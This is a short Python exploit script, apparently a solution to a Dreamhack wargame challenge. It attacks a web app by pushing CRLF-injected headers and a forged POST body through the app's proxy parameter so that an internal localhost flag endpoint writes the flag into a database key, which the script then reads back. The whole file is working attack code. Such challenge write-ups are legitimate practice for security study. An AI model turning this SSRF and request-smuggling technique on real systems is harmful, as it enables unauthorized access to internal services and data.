import requests
import urllib

HOST="http://host3.dreamhack.games"
PORT="15876"
URL=HOST+":"+PORT

print("ATTACKING: "+URL)


r = requests.get(HOST+':'+str(PORT)+'/index.php?action=db/create&key=five')
print(r.content.decode())

r = requests.get(HOST+':'+str(PORT)+'/index.php?action=db/save&dbkey=deazyl&key=five&value=hack')
print(r.content.decode())

s = requests.Session()
req = requests.Request('GET', HOST+':'+str(PORT)+'/index.php?action=net/proxy/post&url=localhost/action/flag/flag.php&'+urllib.parse.quote('\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: '+str(len('mode=write&dbkey=deazyl&key=five'))+'\r\n\r\nmode=write&dbkey=deazyl&key=five\r\n'))
prepped = req.prepare()
resp = s.send(prepped)
if(resp.content.decode().find('success') != -1):
    print(resp.content.decode())


s = requests.Session()
req = requests.Request('GET', HOST+':'+str(PORT)+'/index.php?action=db/read&dbkey=deazyl&key=five')
prepped = req.prepare()
print(prepped.url)
resp = s.send(prepped)
print(resp.content.decode())


